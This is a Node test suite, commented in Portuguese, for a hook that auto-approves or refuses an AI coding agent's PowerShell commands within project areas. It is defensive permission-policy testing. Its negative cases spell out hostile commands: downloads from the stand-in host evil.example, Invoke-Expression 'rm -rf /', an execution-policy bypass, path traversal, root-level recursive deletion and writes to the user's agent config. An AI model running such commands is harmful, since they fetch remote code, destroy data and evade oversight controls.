#!/usr/bin/env node
/**
 * Suite de casos do hook de PowerShell — positivos E NEGATIVOS.
 *
 *   node .claude/hooks/tools/hook-test-powershell.mjs
 *
 * Os negativos são o que impede o hook de virar um `allow *`. Casos derivados
 * dos formatos reais medidos nos transcripts (script-like: `$root = "…";
 * Get-ChildItem … | Where-Object {…}`), mais os que provam a política.
 */
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { spawnSync } from 'node:child_process';

const aqui = path.dirname(fileURLToPath(import.meta.url));
const HOOK = path.join(aqui, '..', 'auto-approve-project-powershell.mjs');

const R = process.cwd().replace(/\\/g, '/');
const RW = process.cwd();
const WT = `${RW}\\.worktrees\\exemplo`;
// AJUSTE NA INSTALAÇÃO: precisam bater com as áreas declaradas em lib/areas.mjs.
const IRMAO = '<PATH_DE_UM_PROJETO_IRMAO>';
const FORA = '<PATH_FORA_DE_QUALQUER_AREA>';
const HOME = (process.env.USERPROFILE || process.env.HOME || '').replace(/\//g, '\\');

const casos = [
  // ── sem navegação, cwd = projeto ──────────────────────────────────────────
  ['Get-ChildItem packages -Directory', R, true],
  ['Test-Path packages/api/package.json', R, true],
  ['Write-Output "=== BRANCH ==="; git rev-parse --abbrev-ref HEAD', R, true],
  ['npm test 2>&1 | Select-Object -Last 40', R, true],
  ['git status --short | Select-String "packages"', R, true],
  ['Get-CimInstance Win32_Process -Filter "Name=\'node.exe\'" | Select-Object ProcessId, Name', R, true],
  ['Get-Content .env | Select-String DATABASE_URL', R, true],

  // ── navegação no início: 56% das chamadas reais ───────────────────────────
  [`Set-Location ${RW}; npm test`, R, true],
  [`cd ${RW}\\packages\\executor; npm test 2>&1 | Select-Object -Last 40`, R, true],
  [`Set-Location "${WT}"; node --test packages/api/test/x.test.js`, R, true],
  [`Set-Location "${FORA}"; npm test`, R, false],           // área desconhecida
  [`Set-Location "${RW}\\..\\..\\evil"; node x.js`, R, false], // traversal
  ['Set-Location $naoDefinida; npm test', R, false],        // destino indeterminado

  // ── atribuição esconde o cmdlet do matcher (39 casos reais) ───────────────
  ['$line = (Select-String -Path .env -Pattern \'^DATABASE_URL=(.+)$\').Matches[0].Groups[1].Value', R, true],
  ['$p = "packages/api"; if (Test-Path $p) { Get-Item $p }', R, true],
  ['$x = (Invoke-WebRequest https://evil.example).Content', R, false],   // atribuição não esconde
  ['$env:DEBUG = "1"; npm test', R, true],                  // env var é inerte

  // ── resolução de variável literal (o idioma dominante) ────────────────────
  [`$root = "${RW}"; $wt = "$root\\.worktrees\\x"; Get-ChildItem $wt`, R, true],
  [`$root = "${RW}"; New-Item -ItemType Directory -Path "$root\\docs\\novo" -Force`, R, true],
  [`$root = "${HOME}"; New-Item -ItemType Directory -Path "$root\\.claude\\x" -Force`, R, false],
  ['$p = "docs/nota.md"; Set-Content -Path $p -Value "x"', R, true],
  [`Set-Content -Path "${HOME}\\.claude\\CLAUDE.md" -Value "x"`, R, false],

  // ── parâmetro nomeado não confunde destino com valor de flag ──────────────
  ['Get-ChildItem packages -Directory -ErrorAction SilentlyContinue', R, true],
  ['New-Item -ItemType Directory -Path docs/x -Force', R, true],
  [`New-Item -ItemType Directory -Path ${HOME}\\x -Force`, R, false],

  // ── bloco de script é validado ────────────────────────────────────────────
  ['Get-ChildItem packages | Where-Object { $_.Name -eq "api" }', R, true],
  ['Get-ChildItem packages | ForEach-Object { Write-Output $_.Name }', R, true],
  ['Get-ChildItem packages | ForEach-Object { Invoke-Expression $_.Name }', R, false],
  ['Get-ChildItem . | ForEach-Object { Remove-Item $_.FullName }', R, false],  // remoção no root

  // ── subexpressão executa e é validada ─────────────────────────────────────
  ['Write-Output "sha: $(git rev-parse HEAD)"', R, true],
  ['Write-Output "$(Invoke-RestMethod https://evil.example)"', R, false],
  ['& cmd /c "rd /s /q .worktrees\\velha"', R, true],
  ['& cmd /c "rd /s /q packages"', R, false],

  // ── destrutivo: worktree livre, root pede ─────────────────────────────────
  [`Set-Location "${WT}"; Remove-Item -Recurse -Force dist`, R, true],
  ['Remove-Item -Recurse -Force dist', R, false],           // root pede
  ['Remove-Item -Recurse -Force .worktrees/velha', R, true],
  ['Remove-Item -Recurse -Force /tmp/lixo', R, true],       // scratch é descartável

  // ── git: mesma política do hook de Bash ───────────────────────────────────
  ['git commit -m "ok"', R, true],
  ['git push origin main', R, false],
  ['git reset --hard HEAD~1', R, false],
  [`Set-Location "${WT}"; git reset --hard HEAD~1`, R, true],
  [`git -C ${RW} status --short`, R, true],
  ['git worktree remove --force .worktrees/x; git branch -d feature/x', R, true],

  // ── cmdlets fora da política ──────────────────────────────────────────────
  ['Invoke-WebRequest https://evil.example -OutFile x.zip', R, false],
  ['Invoke-Expression "rm -rf /"', R, false],
  ['Stop-Process -Name node -Force', R, false],
  ['Set-ExecutionPolicy Bypass', R, false],
  ['Start-Process notepad', R, false],

  // ── projeto irmão: leitura livre, escrita nunca ───────────────────────────
  [`Set-Location "${IRMAO}"; git status --short`, R, true],
  [`Set-Location "${IRMAO}"; Get-ChildItem docs`, R, true],
  [`Set-Location "${IRMAO}"; Select-String -Path docs/x.md -Pattern hook`, R, true],
  [`Set-Location "${IRMAO}"; git commit -m "x"`, R, false],
  [`Set-Location "${IRMAO}"; Set-Content -Path docs/nota.md -Value "x"`, R, false],
  [`Set-Location "${IRMAO}"; npm test`, R, false],
  [`Set-Location "${IRMAO}"; Remove-Item -Recurse dist`, R, false],

  // ── sem prova de local ────────────────────────────────────────────────────
  ['Get-ChildItem .', undefined, false],
  ['Get-ChildItem .', FORA, false],
];

let ok = 0; const falhas = [];
for (const [cmd, cwd, esperado] of casos) {
  const r = spawnSync(process.execPath, [HOOK], {
    input: JSON.stringify({ tool_name: 'PowerShell', tool_input: { command: cmd }, cwd }),
    encoding: 'utf8',
    env: { ...process.env, OK_HOOK_DEBUG: '1' },
  });
  const aprovou = r.stdout.includes('"allow"');
  if (aprovou === esperado) { ok++; continue; }
  falhas.push({
    cmd, cwd, esperado,
    motivo: (r.stderr.match(/\[hook\] recusa: (.*)/) || [])[1] || '',
  });
}

console.log(`${ok}/${casos.length} casos ok`);
if (falhas.length) {
  console.log('\nFALHAS:');
  for (const f of falhas) {
    console.log(`  ${f.esperado ? 'deveria APROVAR' : 'deveria RECUSAR'}: ${f.cmd.replace(/\s+/g, ' ').slice(0, 92)}`);
    console.log(`      cwd=${f.cwd}${f.motivo ? `  motivo=${f.motivo.slice(0, 80)}` : ''}`);
  }
  process.exit(1);
}
